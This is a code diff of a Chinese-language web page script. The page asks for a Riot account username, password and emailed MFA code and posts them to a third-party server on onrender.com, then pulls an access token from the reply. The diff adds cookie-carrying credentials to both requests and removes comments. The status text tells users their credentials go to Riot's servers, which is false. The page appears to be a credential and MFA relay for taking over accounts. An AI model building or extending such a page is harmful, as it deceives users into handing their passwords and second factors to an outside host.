@@ -58,7 +58,7 @@
 
 <script>
 const BACKEND_URL = "https://zenith-auth-daily.onrender.com";
-let currentStage = "LOGIN"; // 狀態機：LOGIN 或者是 MFA
+let currentStage = "LOGIN";
 
 async function processAuth() {
     const btn = document.getElementById('submitBtn');
@@ -73,10 +73,12 @@ async function processAuth() {
 
         statusMsg.innerText = "🔑 正在向 Riot 伺服器提交憑證驗證...";
         try {
+            // 關鍵修改：加上 credentials: "include" 讓跨網域安全傳輸 Cookie 生效
             let res = await fetch(`${BACKEND_URL}/api/auth/login`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username: user, password: pass })
+                body: JSON.stringify({ username: user, password: pass }),
+                credentials: "include"
             });
             let data = await res.json();
             handleResponse(data);
@@ -93,7 +95,8 @@ async function processAuth() {
             let res = await fetch(`${BACKEND_URL}/api/auth/mfa`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ code: mfa })
+                body: JSON.stringify({ code: mfa }),
+                credentials: "include"
             });
             let data = await res.json();
             handleResponse(data);
@@ -108,7 +111,6 @@ function handleResponse(data) {
     const btn = document.getElementById('submitBtn');
     const statusMsg = document.getElementById('statusMsg');
 
-    // 情況 A：成功拿到 Token 網址
     if (data.response && data.response.parameters && data.response.parameters.uri) {
         let originalUri = data.response.parameters.uri;
         let match = originalUri.match(/access_token=([^&]+)/);
@@ -121,17 +123,15 @@ function handleResponse(data) {
         return;
     }
 
-    // 情況 B：觸發二步驟驗證 (Riot 回傳物件裡有 type: "mfa" 或是 error: "mfa_required")
     if (data.type === "mfa" || data.error === "mfa_required") {
-        document.getElementById('credentialsArea').style.display = "none"; // 隱藏帳密框
-        document.getElementById('mfaGroup').style.display = "block";        // 顯示驗證碼框
+        document.getElementById('credentialsArea').style.display = "none";
+        document.getElementById('mfaGroup').style.display = "block";
         statusMsg.innerText = "🔒 偵測到驗證保護！請至信箱收信，打上 6 位數驗證碼後再次點擊按鈕！";
         currentStage = "MFA";
         btn.disabled = false;
         return;
     }
 
-    // 情況 C：密碼或代碼真的打錯
     alert("驗證失敗：請檢查輸入是否正確，或重新整理再試一次。");
     btn.disabled = false;
     statusMsg.innerText = "❌ 驗證失敗";
